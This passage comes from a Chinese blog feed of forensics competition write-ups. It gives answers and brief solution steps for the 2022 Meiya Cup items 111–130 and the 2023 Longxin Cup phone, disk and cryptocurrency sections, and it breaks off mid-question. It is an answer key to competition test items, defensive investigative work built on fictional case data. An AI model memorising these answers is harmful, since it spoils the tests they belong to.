src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170923036.png" alt="image-20231103202303277"></p><h3 id="111"><a href="#111" class="headerlink" title="111"></a>111</h3><pre><code>[单选题] 朗尼将加密了的比特币钱包的密码存在他计算机的一个档案里，这个档案的副档名是什么? (以大写英文及阿拉伯数字回答) (3分)A. DMGB. PDFC. ASDD. ZIPE. PNG</code></pre><pre><code>C</code></pre><p>一个一个搜 找到asd的时候 找到一个<code>儲存自動回復文件1.asd</code> 将其提取出来 将后缀名改为.doc 看到密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170923001.png" alt="image-20231103204003350"></p><h3 id="112"><a href="#112" class="headerlink" title="112"></a>112</h3><pre><code>[单选题] 朗尼在手机里有一个加密了的比特币钱包，他采用什么应用程序把该钱包里的黑钱转换成另一种加密货币? (2分)A. SafepalB. MetamaskC. ChangellyD. Opensea</code></pre><pre><code>C</code></pre><p>在手机中找到一张图片 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170923762.png" alt="image-20231103212358756"></p><h3 id="113"><a href="#113" class="headerlink" title="113"></a>113</h3><pre><code>[单选题] 承上题，这次转换加密货币的日期和时间是什么? (以时区UTC+8回答) (2分)A. 2022-10-07 10:29时B. 2022-10-07 11:06时C. 2022-10-07 11:07时D. 2022-10-07 13:54时</code></pre><pre><code>D</code></pre><p>要找交易完成的时间 也是找到图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170923592.png" alt="image-20231103212532558"></p><h3 id="114"><a href="#114" class="headerlink" title="114"></a>114</h3><pre><code>[单选题]朗尼在计算机里采用什么浏览器 (Browser) 及在什么日期时间在他的计算机安装 ‘MetaMask’ ? (以时区UTC+8回答) (1分)A. Chrome 2022-08-25 12:35时B. Chrome 2022-10-07 14:29时C. Firefox 2022-08-25 12:35时D. Firefox 2022-10-07 14:29时</code></pre><pre><code>C</code></pre><p>朗尼计算机中没有火狐浏览器只有谷歌浏览器 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170923117.png" alt="image-20231104212545340"></p><p>搜索可得 MetaMask在谷歌浏览器中是一款插件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170923101.png" alt="image-20231104212429418"></p><p>在谷歌浏览器中查找历史记录 可以看到安装时间是8-25 12:35</p><h3 id="115"><a href="#115" class="headerlink" title="115"></a>115</h3><pre><code>[单选题] 朗尼在计算机里所创建的非同质化通证 (Non-Fungible Token - NFT) 使用哪一个种区块链 (Blockchain) 技术? (1分)A. EthereumB. PolygonC. SolanaD. ArbitrumE. Klaytn</code></pre><pre><code>A</code></pre><p>在截图中可以看到 使用的区块链技术是Ethereum</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170923034.png" alt="image-20231104212616900"></p><h3 id="116"><a href="#116" class="headerlink" title="116"></a>116</h3><pre><code>[单选题] 朗尼在什么日期时间把计算机中创建的非同质化通证 (NFT) 放售? (以时区UTC+8回答) (2分)A. 2022-10-07 14:47时B. 2022-10-07 14:49时C. 2022-10-07 14:52时D. 2022-10-07 14:54时</code></pre><pre><code>B</code></pre><p>我们知道朗尼是在计算机的谷歌浏览器上使用opensea网站进行虚拟币交易的 直接找历史记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170924319.png" alt="image-20231104213257552"></p><h3 id="117"><a href="#117" class="headerlink" title="117"></a>117</h3><pre><code>[多选题] 朗尼的手机里，有什么应用程序与将黑钱 (比特币) 转换成另一加密货币的地址有关? (2分)A. MetamaskB. OpenseaC. SafepalD. YouTube</code></pre><pre><code>B</code></pre><p>图片中显示的网址上是opensea</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170924414.png" alt="image-20231103212623956"></p><h3 id="118"><a href="#118" class="headerlink" title="118"></a>118</h3><pre><code>[单选题] 朗尼的手机里，于2022-10-07，15:07时至15:08时做过什么动作? (以时区UTC+8回答) (2分)A. 登录 ‘Metamask’B. 登录 ‘Opensea’C. 屏幕截图 (Screen Capture)D. 登录 ‘YouTube’</code></pre><p>在时间线中进行过滤 最后只能看到Screenshot的记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170926200.png" alt="image-20231104204644074"></p><h3 id="119"><a href="#119" class="headerlink" title="119"></a>119</h3><pre><code>[多选题] 承上题，从这个动作中能找到什么资讯? (1分)A. Opensea.ioB. Ethereum Main NetworkC. Your purchase is completeD. Subtotal = 0.0253 ETHE. Good Luck</code></pre><pre><code>ABCD</code></pre><p>118是屏幕截图 预览看到是一张交易记录截图 内容包含ABCD<br><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170926952.png" alt="image-20231104205208451"></p><h3 id="120"><a href="#120" class="headerlink" title="120"></a>120</h3><pre><code>[填空题] 在朗尼的计算机旁找到 ‘MetaMask’ 的密码是 ‘opensea741’，找出朗尼计算机里的 ‘MetaMask’ 中有多少加密货币余额? (不要输入 ‘.’，以阿拉伯数字回答，如 0.137 需回答 0137) (2分)</code></pre><pre><code>00247</code></pre><p>需要仿真计算机 由114题得知 MetaMask是下载在朗尼计算机谷歌浏览器中的一款插件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170926920.png" alt="image-20231106150026267"></p><p>输入密码登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927703.png" alt="image-20231106150058013"></p><h3 id="121"><a href="#121" class="headerlink" title="121"></a>121</h3><pre><code>[填空题] 朗尼的计算机曾用什么电邮地址登录电邮帐号? (不要输入答案中的 ‘@’ 及 ‘.’，以大写英文及阿拉伯数字回答，如 name@mail.com，需回答 NAMEMAILCOM) (1分)</code></pre><pre><code>ROONEYCHAN19830801GMAILCOM</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927493.png" alt="image-20231104213701497"></p><h3 id="122"><a href="#122" class="headerlink" title="122"></a>122</h3><pre><code>[填空题] 什么电邮账号曾接收过上述电邮地址发送的电邮？（不要输入答案中的 ‘@’ 及 ‘.’，以大写英文及阿拉伯数字回答，如 name@mail.com，需回答 NAMEMAILCOM） (1分)</code></pre><pre><code>KINGHOO0W0GMAILCOM</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927404.png" alt="image-20231106172351529"></p><h3 id="123"><a href="#123" class="headerlink" title="123"></a>123</h3><pre><code>[多选题]承上题，上述的电邮附件包含哪些类型的档案? (3分)A. pdfB. docC. pngD. txtE. jpg</code></pre><pre><code>DE</code></pre><p>这个附件是<code>Recovery seed.zip</code> 直接导出 解压之后是两个文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927601.png" alt="image-20231106160731052"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927858.png" alt="image-20231106160720207"></p><p>但是解压出来的两个文件和压缩包的大小并不匹配 使用winrar进行修复  再次进行解压  发现还有一个jpg文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927910.png" alt="image-20231106160953127"></p><h3 id="124"><a href="#124" class="headerlink" title="124"></a>124</h3><pre><code>[填空题] 上述电邮附件里的文件，被遮蔽的英文单字是什么? (以大写英文回答) (3分)</code></pre><pre><code>teach</code></pre><p>倒数三四位看起来是ea</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927641.png" alt="image-20231106165447595"></p><p>在仿真起 在计算机中找到字典<code>C:\Program Files(x86)\Electrum\electrum\wordlist</code> 搜索each  发现只有<code>beach</code>和<code>teach</code></p><p>分别尝试使用这两个种子去恢复钱包 </p><h3 id="125"><a href="#125" class="headerlink" title="125"></a>125</h3><pre><code>[填空题]根据上述电邮附件里找到的回复种子 (Recovery Seed)，计算朗尼在 ‘MetaMask’ 使用的以太币 (Ethereum) 地址。 (提示： BIP-44 derivation path = m/44’/60’/0’/0/0) (以大写英文及阿拉伯数字回答) (3分)</code></pre><pre><code>0X2AAEAB9592B7A9CE6355ED19D048F86F5EA5D819</code></pre><p>这题其实直接使用第120题给的MetaMask插件登陆密码 就可以看到使用的以太币地址</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927209.png" alt="image-20231106180402995"></p><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><pre><code>[填空题]在朗尼手机于2022年9月30日的 &#39;WhatsApp&#39; 对话里，有一段音讯 (Voice Message) 提到王景浩会给朗尼现金多少作为租用 &#39;VPN&#39; 的租金? (以阿拉伯数字回答) (3分)</code></pre><pre><code>3000</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927750.png" alt="image-20231104214323475"></p><p>这是一段逆向音频 找个在线网站逆回来就好了</p><h3 id="126"><a href="#126" class="headerlink" title="126."></a>126.</h3><pre><code>[单选题]在2022年9月28日18时51分 (UTC+8)，朗尼曾经在手机用WhatsApp与王景浩对话，语句 [有灯，风扇经常在转]，回复这句话的相关语句是什么? (1分)A. 你有推介吗?B. 我之前放在你家的机械运作正常吗?C. 有灯号风扇有转动?D. 帅吗?</code></pre><pre><code>C</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927106.png" alt="image-20231104214547175"></p><h3 id="127"><a href="#127" class="headerlink" title="127."></a>127.</h3><pre><code>[单选题]朗尼通过手机相约王景浩于10月15日到哪一个地区食晚饭? (1分)A. 荃湾B. 湾仔C. 九龙城D. 九龙塘</code></pre><pre><code>A</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311051123768.png" alt="image-20231105112317657"></p><h3 id="128"><a href="#128" class="headerlink" title="128."></a>128.</h3><pre><code>[填空题]朗尼手机的 &#39;WhatsApp&#39; 号码是什么? ( 号码 ) @s.whatsapp.net? (以阿拉伯数字回答) 85259814785(1分)</code></pre><pre><code>85259814785</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927444.png" alt="image-20231104214247695"></p><h3 id="129"><a href="#129" class="headerlink" title="129."></a>129.</h3><pre><code>[多选题]朗尼的手机曾连接以下哪一个WIFI网络? (2分)A. taiiphoneB. rooneyhomeC. Function RoomD. TP-Link</code></pre><pre><code>AC</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927225.png" alt="image-20231104214654844"></p><h3 id="130"><a href="#130" class="headerlink" title="130."></a>130.</h3><pre><code>[单选题]朗尼的手机曾连接WIFI [SSID: faifai], 它的登录密码是什么 ? (2分)A. abcd5678B. aaaa0000C. rooney111D. rdfu1234</code></pre><pre><code>D</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927658.png" alt="image-20231104214708180"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2022年美亚杯团体赛&quot;&gt;&lt;a href=&quot;#2022年美亚杯团体赛&quot; class=&quot;headerlink&quot; title=&quot;2022年美亚杯团体赛&quot;&gt;&lt;/a&gt;2022年美亚杯团体赛&lt;/h1&gt;&lt;h2 id=&quot;AGC计算机&quot;&gt;&lt;a href=&quot;#AGC计算机&quot; cla</summary>
      
    
    
    
    <category term="取证" scheme="http://w3nx1z1.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
  </entry>
  
  <entry>
    <title>2023龙信杯取证复现</title>
    <link href="http://w3nx1z1.github.io/2023/10/18/2023%E9%BE%99%E4%BF%A1%E6%9D%AF%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9Bwp/"/>
    <id>http://w3nx1z1.github.io/2023/10/18/2023%E9%BE%99%E4%BF%A1%E6%9D%AF%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9Bwp/</id>
    <published>2023-10-18T14:23:59.555Z</published>
    <updated>2023-10-25T00:54:41.112Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2023龙信杯取证比赛wp"><a href="#2023龙信杯取证比赛wp" class="headerlink" title="2023龙信杯取证比赛wp"></a>2023龙信杯取证比赛wp</h1><h2 id="移动终端取证"><a href="#移动终端取证" class="headerlink" title="移动终端取证"></a>移动终端取证</h2><h3 id="1-请分析涉案手机的设备标识是-。（标准格式：12345678）"><a href="#1-请分析涉案手机的设备标识是-。（标准格式：12345678）" class="headerlink" title="1.请分析涉案手机的设备标识是_______。（标准格式：12345678）"></a>1.请分析涉案手机的设备标识是_______。（标准格式：12345678）</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191552470.png" alt="image-20231019155226440"></p><pre><code>85069625</code></pre><h3 id="2-请确认嫌疑人首次安装目标APP的安装时间是-。（标准格式：2023-09-13-11-32-23）"><a href="#2-请确认嫌疑人首次安装目标APP的安装时间是-。（标准格式：2023-09-13-11-32-23）" class="headerlink" title="2.请确认嫌疑人首次安装目标APP的安装时间是______。（标准格式：2023-09-13.11:32:23）"></a>2.请确认嫌疑人首次安装目标APP的安装时间是______。（标准格式：2023-09-13.11:32:23）</h3><p>从聊天记录中获得软件名称</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191604510.png" alt="image-20231019160401481"></p><p>再从应用列表中找到相应应用安装时间</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191607821.png" alt="image-20231019160746790"></p><pre><code>2022-11-16.19:11:26</code></pre><h3 id="3-此检材共连接过-个WiFi。（标准格式：1）"><a href="#3-此检材共连接过-个WiFi。（标准格式：1）" class="headerlink" title="3.此检材共连接过______个WiFi。（标准格式：1）"></a>3.此检材共连接过______个WiFi。（标准格式：1）</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191608461.png" alt="image-20231019160838420"></p><pre><code>6</code></pre><h3 id="4-嫌疑人手机短信记录中未读的短信共有-条。（标准格式：12）"><a href="#4-嫌疑人手机短信记录中未读的短信共有-条。（标准格式：12）" class="headerlink" title="4.嫌疑人手机短信记录中未读的短信共有______条。（标准格式：12）"></a>4.嫌疑人手机短信记录中未读的短信共有______条。（标准格式：12）</h3><p>已读未读软件上是真看不出来 这里学到了 直接查看手机镜像文件的数据库</p><pre><code>\data\com.android.providers.telephony\databases\mmssms.db</code></pre><p>找到之后 用navicat打开数据库文件</p><p>找到<strong>sms</strong> 里面read列数值为0的 就是未读的短信 按照升序排列 可以找到17个未读短信</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191622444.png" alt="image-20231019162252378"></p><pre><code>17</code></pre><h3 id="5-嫌疑人检材手机在浏览器中下载海报背景图的网址是-。（标准格式：http-www-baidu-com-admin-index-html）"><a href="#5-嫌疑人检材手机在浏览器中下载海报背景图的网址是-。（标准格式：http-www-baidu-com-admin-index-html）" class="headerlink" title="5.嫌疑人检材手机在浏览器中下载海报背景图的网址是_______。（标准格式：http://www.baidu.com/admin/index.html）"></a>5.嫌疑人检材手机在浏览器中下载海报背景图的网址是_______。（标准格式：<a href="http://www.baidu.com/admin/index.html%EF%BC%89">http://www.baidu.com/admin/index.html）</a></h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191629108.png" alt="image-20231019162956073"></p><pre><code>http://m.ziyuanhu.com/pics/1725.html</code></pre><h3 id="6-请分析涉案海报的推广ID是-。（标准格式：123456）"><a href="#6-请分析涉案海报的推广ID是-。（标准格式：123456）" class="headerlink" title="6.请分析涉案海报的推广ID是________。（标准格式：123456）"></a>6.请分析涉案海报的推广ID是________。（标准格式：123456）</h3><pre><code>114092</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191633859.png" alt="image-20231019163320780"></p><h3 id="7-嫌疑人通过短信群发去推广APP，请问收件人中有-个号码是无效的。（标准格式：12）"><a href="#7-嫌疑人通过短信群发去推广APP，请问收件人中有-个号码是无效的。（标准格式：12）" class="headerlink" title="7.嫌疑人通过短信群发去推广APP，请问收件人中有__个号码是无效的。（标准格式：12）"></a>7.嫌疑人通过短信群发去推广APP，请问收件人中有__个号码是无效的。（标准格式：12）</h3><pre><code>1</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191635880.png" alt="image-20231019163507845"></p><h3 id="8-通过分析，嫌疑人推送的微信账号是-。（标准格式：Lx20230916）"><a href="#8-通过分析，嫌疑人推送的微信账号是-。（标准格式：Lx20230916）" class="headerlink" title="8.通过分析，嫌疑人推送的微信账号是______。（标准格式：Lx20230916）"></a>8.通过分析，嫌疑人推送的微信账号是______。（标准格式：Lx20230916）</h3><pre><code>Gq20221101</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191636950.png" alt="image-20231019163630897"></p><h3 id="9-请校验嫌疑人使用的“变声器”APK的包名是-。（标准格式：com-baidu-com）"><a href="#9-请校验嫌疑人使用的“变声器”APK的包名是-。（标准格式：com-baidu-com）" class="headerlink" title="9.请校验嫌疑人使用的“变声器”APK的包名是________。（标准格式：com.baidu.com）"></a>9.请校验嫌疑人使用的“变声器”APK的包名是________。（标准格式：com.baidu.com）</h3><p>直接在火眼中搜索变声器</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191659801.png" alt="image-20231019165910759"></p><p>找到包名</p><pre><code>com.chuci.voice</code></pre><h3 id="10-号商的联系人注册APP的ID是-。（标准格式：12345678）"><a href="#10-号商的联系人注册APP的ID是-。（标准格式：12345678）" class="headerlink" title="10.号商的联系人注册APP的ID是_________。（标准格式：12345678）"></a>10.号商的联系人注册APP的ID是_________。（标准格式：12345678）</h3><p>嫌疑人在蝙蝠APP上与号商联系</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191701916.png" alt="image-20231019170108878"></p><pre><code>36991915</code></pre><h3 id="11-嫌疑人于2022年11月份在-城市。（标准格式：成都）"><a href="#11-嫌疑人于2022年11月份在-城市。（标准格式：成都）" class="headerlink" title="11.嫌疑人于2022年11月份在_______城市。（标准格式：成都）"></a>11.嫌疑人于2022年11月份在_______城市。（标准格式：成都）</h3><p>查看嫌疑人与号商的聊天记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191702610.png" alt="image-20231019170202564"></p><p>嫌疑人说在家 说明并不是在上海</p><p>查看图片的位置信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240913396.png" alt="image-20231019213941908"></p><p>经纬度一搜 就可以发现是在苏州</p><pre><code>苏州</code></pre><h3 id="12-嫌疑人共购买-个QQ号。（标准格式：1）"><a href="#12-嫌疑人共购买-个QQ号。（标准格式：1）" class="headerlink" title="12.嫌疑人共购买_______个QQ号。（标准格式：1）"></a>12.嫌疑人共购买_______个QQ号。（标准格式：1）</h3><pre><code>8</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240913391.png" alt="image-20231020144711656"></p><p>可以看出 嫌疑人本次购买5个手机号 之前还购买了3个手机号 一共是买了8个</p><h2 id="介质取证"><a href="#介质取证" class="headerlink" title="介质取证"></a>介质取证</h2><h3 id="1-对PC镜像分析，请确定涉案电脑的开机密码是-。（标准格式：123456）"><a href="#1-对PC镜像分析，请确定涉案电脑的开机密码是-。（标准格式：123456）" class="headerlink" title="1.对PC镜像分析，请确定涉案电脑的开机密码是_______。（标准格式：123456）"></a>1.对PC镜像分析，请确定涉案电脑的开机密码是_______。（标准格式：123456）</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240914248.png" alt="image-20231020160156911"></p><p>火眼仿真直接把密码分析出来了</p><pre><code>Longxin360004</code></pre><h3 id="2-涉案计算机最后一次正常关机时间-。（标准格式：2023-1-11-11-11-11）"><a href="#2-涉案计算机最后一次正常关机时间-。（标准格式：2023-1-11-11-11-11）" class="headerlink" title="2.涉案计算机最后一次正常关机时间_______。（标准格式：2023-1-11.11:11:11）"></a>2.涉案计算机最后一次正常关机时间_______。（标准格式：2023-1-11.11:11:11）</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240913411.png" alt="image-20231020153559435"></p><pre><code>2023-09-16 18:20:34</code></pre><h3 id="3-分析涉案计算机，在2022年11月4日此电脑共开机时长为-。（标准格式：1小时1分1秒）"><a href="#3-分析涉案计算机，在2022年11月4日此电脑共开机时长为-。（标准格式：1小时1分1秒）" class="headerlink" title="3.分析涉案计算机，在2022年11月4日此电脑共开机时长为_______。（标准格式：1小时1分1秒）"></a>3.分析涉案计算机，在2022年11月4日此电脑共开机时长为_______。（标准格式：1小时1分1秒）</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240914737.png" alt="image-20231020154024398"></p><p>应该是将11月4日这一天的持续时间都加起来</p><pre><code>13:41:16</code></pre><h3 id="4-对PC镜像分析，请确认微信是否是开机自启动程序。（标准格式：是-x2F-否）"><a href="#4-对PC镜像分析，请确认微信是否是开机自启动程序。（标准格式：是-x2F-否）" class="headerlink" title="4.对PC镜像分析，请确认微信是否是开机自启动程序。（标准格式：是&#x2F;否）"></a>4.对PC镜像分析，请确认微信是否是开机自启动程序。（标准格式：是&#x2F;否）</h3><pre><code>是</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240914543.png" alt="image-20231020154245573"></p><h3 id="5-检材硬盘中有一个加密分区，给出其中“我的秘密-jpg”文档的解密内容。（标准格式：Longxin0924）"><a href="#5-检材硬盘中有一个加密分区，给出其中“我的秘密-jpg”文档的解密内容。（标准格式：Longxin0924）" class="headerlink" title="5.检材硬盘中有一个加密分区，给出其中“我的秘密.jpg”文档的解密内容。（标准格式：Longxin0924）"></a>5.检材硬盘中有一个加密分区，给出其中“我的秘密.jpg”文档的解密内容。（标准格式：Longxin0924）</h3><p>在取证大师中直接搜索Bitlocker 找到恢复密钥串</p><pre><code>380633-655996-366696-540353-708532-680647-516516-119647</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240913477.png" alt="image-20231020160022809"></p><p>使用恢复密钥串 在火眼中解开加密分区 找到<code>我的秘密.jpg</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240914184.png" alt="image-20231020160312218"></p><pre><code>TWltaTEyMzQ=</code></pre><p>解base64</p><pre><code>Mimi1234</code></pre><h3 id="6-接上题，请问该嫌疑人10月份工资是-元。（标准格式：123）"><a href="#6-接上题，请问该嫌疑人10月份工资是-元。（标准格式：123）" class="headerlink" title="6.接上题，请问该嫌疑人10月份工资是_______元。（标准格式：123）"></a>6.接上题，请问该嫌疑人10月份工资是_______元。（标准格式：123）</h3><pre><code>19821</code></pre><p>之前看到的工资条是假的 使用刚刚在我的秘密中得到的密码 解压下面的压缩包 得到真正的工资条</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240913786.png" alt="image-20231020162116772"></p><h3 id="7-对PC镜像进行分析，浏览器中使用过QQ邮箱，请问该邮箱的密码是-。（标准格式：Longxin0924）"><a href="#7-对PC镜像进行分析，浏览器中使用过QQ邮箱，请问该邮箱的密码是-。（标准格式：Longxin0924）" class="headerlink" title="7.对PC镜像进行分析，浏览器中使用过QQ邮箱，请问该邮箱的密码是______。（标准格式：Longxin0924）"></a>7.对PC镜像进行分析，浏览器中使用过QQ邮箱，请问该邮箱的密码是______。（标准格式：Longxin0924）</h3><pre><code>Longxin@2023</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310212159661.png" alt="image-20231021215911585"></p><h3 id="8-结合手机镜像分析，得出一个推广ID，请在此检材找到此海报，请写出路径。（标准格式：D-X-X-1-txt）"><a href="#8-结合手机镜像分析，得出一个推广ID，请在此检材找到此海报，请写出路径。（标准格式：D-X-X-1-txt）" class="headerlink" title="8.结合手机镜像分析，得出一个推广ID，请在此检材找到此海报，请写出路径。（标准格式：D:\X\X\1.txt）"></a>8.结合手机镜像分析，得出一个推广ID，请在此检材找到此海报，请写出路径。（标准格式：D:\X\X\1.txt）</h3><p>由手机镜像可知 推广ID是<code>114092</code></p><p>直接在取证大师中进行搜索</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240913839.png" alt="image-20231020164520545"></p><p>一共是两张png图片 1.png和2.png</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240913971.png" alt="image-20231020214827873"></p><p>使用010查看1.png和2.png的内容 发现在2.png的文件尾有隐藏信息银行卡号  因此说的应该是2.png</p><pre><code>C:\Program Files (x86)\Tencent\WeChat\2.png</code></pre><h3 id="9-请找出嫌疑人的2022年收入共-。（标准格式：123）"><a href="#9-请找出嫌疑人的2022年收入共-。（标准格式：123）" class="headerlink" title="9.请找出嫌疑人的2022年收入共_______。（标准格式：123）"></a>9.请找出嫌疑人的2022年收入共_______。（标准格式：123）</h3><p>先使用vc容器将找到的dd容器进行挂载 再用火眼进行分析</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310212215051.png" alt="image-20231021221508024"></p><p>可以看到被删掉的2022年收入.xlsx</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310212215308.png" alt="image-20231021221551271"></p><p>这也验证了第6题的10月份工资</p><p>相加起来 就可以算出2022年收入</p><pre><code>205673</code></pre><h3 id="10-分析此海报，请找到嫌疑人的银行卡号。（标准格式：62225123456321654）"><a href="#10-分析此海报，请找到嫌疑人的银行卡号。（标准格式：62225123456321654）" class="headerlink" title="10.分析此海报，请找到嫌疑人的银行卡号。（标准格式：62225123456321654）"></a>10.分析此海报，请找到嫌疑人的银行卡号。（标准格式：62225123456321654）</h3><p>在第8题已经分析过了</p><pre><code>6320005020052013476</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310212203630.png" alt="image-20231021220320591"></p><h3 id="虚拟币分析"><a href="#虚拟币分析" class="headerlink" title="虚拟币分析"></a>虚拟币分析</h3><h3 id="1-分析涉案计算机，正确填写中转地址当前的代币种类-。（标准格式：BNB）"><a href="#1-分析涉案计算机，正确填写中转地址当前的代币种类-。（标准格式：BNB）" class="headerlink" title="1.分析涉案计算机，正确填写中转地址当前的代币种类______。（标准格式：BNB）"></a>1.分析涉案计算机，正确填写中转地址当前的代币种类______。（标准格式：BNB）</h3><p>讲上一部分挂载出的npbk文件提取出来 使用命令查看一下文件类型 发现是7z压缩包 直接进行解压 可以看到一个夜神模拟器的镜像 放到火眼中进行分析</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310212224604.png" alt="image-20231021222437572"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310212225570.png" alt="image-20231021222543520"></p><p>找到中转地址的代币种类是</p><pre><code>ETH</code></pre><h3 id="2-分析涉案计算机，正确填写中转地址当前的代币余额数量-。（标准格式：1-23）"><a href="#2-分析涉案计算机，正确填写中转地址当前的代币余额数量-。（标准格式：1-23）" class="headerlink" title="2.分析涉案计算机，正确填写中转地址当前的代币余额数量_______。（标准格式：1.23）"></a>2.分析涉案计算机，正确填写中转地址当前的代币余额数量_______。（标准格式：1.23）</h3><p>打开夜神多开模拟器——导入镜像文件——启动模拟器</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240914881.png" alt="image-20231021225141319"></p><p>这里要注意一点  在仿真上之后一定要断网打开这个软件  不然会将记录全部清空</p><pre><code>4.4981</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240913648.png" alt="image-20231021224905225"></p><h3 id="3-根据中转地址转账记录找出买币方地址。买币方地址：-（标准格式：0x123ABC"><a href="#3-根据中转地址转账记录找出买币方地址。买币方地址：-（标准格式：0x123ABC" class="headerlink" title="3.根据中转地址转账记录找出买币方地址。买币方地址：_____（标准格式：0x123ABC)"></a>3.根据中转地址转账记录找出买币方地址。买币方地址：_____（标准格式：0x123ABC)</h3><pre><code>0x63AA203086938f82380A6A3521cCBf9c56d111eA</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310212229457.png" alt="image-20231021222952427"></p><h3 id="4-根据中转地址转账记录统计买方地址转账金额。转账金额：-ETH-（标准格式-12-3）"><a href="#4-根据中转地址转账记录统计买方地址转账金额。转账金额：-ETH-（标准格式-12-3）" class="headerlink" title="4.根据中转地址转账记录统计买方地址转账金额。转账金额：____ ETH.（标准格式:12.3）"></a>4.根据中转地址转账记录统计买方地址转账金额。转账金额：____ ETH.（标准格式:12.3）</h3><pre><code>150.5</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310212231540.png" alt="image-20231021223119509"></p><p>或者在虚拟币交易软件上也能看到 根据案情 显示卖方先直接向买方转0.5ETH 在经由中间方 向买方最终转入150ETH</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240914696.png" alt="image-20231021225422711"></p><h3 id="5-在创建钱包时，应用APP都会建议我们进行助记词备份，方便以后忘记密码后找回钱包，在办案过程中时常会拿到犯罪嫌疑人备份的助记词的情况。请从以下三组助记词中判断出格式正确的一组（-）"><a href="#5-在创建钱包时，应用APP都会建议我们进行助记词备份，方便以后忘记密码后找回钱包，在办案过程中时常会拿到犯罪嫌疑人备份的助记词的情况。请从以下三组助记词中判断出格式正确的一组（-）" class="headerlink" title="5.在创建钱包时，应用APP都会建议我们进行助记词备份，方便以后忘记密码后找回钱包，在办案过程中时常会拿到犯罪嫌疑人备份的助记词的情况。请从以下三组助记词中判断出格式正确的一组（ 